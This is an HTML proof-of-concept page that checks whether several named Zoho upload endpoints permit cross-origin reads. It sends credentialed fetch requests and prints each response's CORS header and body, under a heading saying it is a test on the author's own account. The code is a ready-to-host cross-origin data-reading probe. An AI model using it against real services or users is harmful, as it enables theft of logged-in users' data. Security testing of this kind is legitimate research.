<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS PoC - Own Test Account</h2>
<button onclick="runAll()">Run Test</button>
<pre id="out" style="background:#111;color:#0f0;padding:10px;"></pre>
<script>
const out = document.getElementById('out');
function log(m){ out.textContent += m + "\n"; }

async function test(label, url){
  log("\n=== " + label + " ===");
  try {
    const r = await fetch(url, { credentials:"include" });
    log("Status: " + r.status);
    log("ACAO: " + r.headers.get("Access-Control-Allow-Origin"));
    const t = await r.text();
    log("Body: " + t.substring(0,400));
  } catch(e){ log("BLOCKED: " + e.message); }
}

async function runAll(){
  out.textContent = "Testing...\n";
  await test("Upload - Root", "https://upload-accl.zoho.com/");
  await test("Upload - Info", "https://upload-accl.zoho.com/upload/info");
  await test("Upload - Status", "https://upload-accl.zoho.com/upload/status");
  await test("Upload - User", "https://upload-accl.zoho.com/upload/user");
  await test("Upload - Files", "https://upload-accl.zoho.com/upload/files");
  log("\n=== DONE ===");
}
</script>
</body>
</html>
